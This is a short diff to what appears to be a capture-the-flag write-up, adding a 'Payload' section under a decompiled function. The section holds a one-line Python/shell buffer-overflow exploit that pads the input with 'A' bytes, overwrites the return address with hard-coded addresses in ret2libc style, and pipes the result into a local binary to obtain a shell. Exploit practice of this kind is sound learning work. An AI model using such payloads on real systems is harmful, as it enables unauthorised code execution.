@@ -96,3 +96,9 @@ int secret_place() {
     return eax;
 }
 ```
+
+### Payload
+
+```
+➜ (python -c "import struct; x = lambda a: struct.pack('<I', a); print'41\x0a' + 'A'*32 + x(0xf7e423e0) + '\xCC'*4 + x(0xf7f63a69);"; cat -) | ~//binary
+```
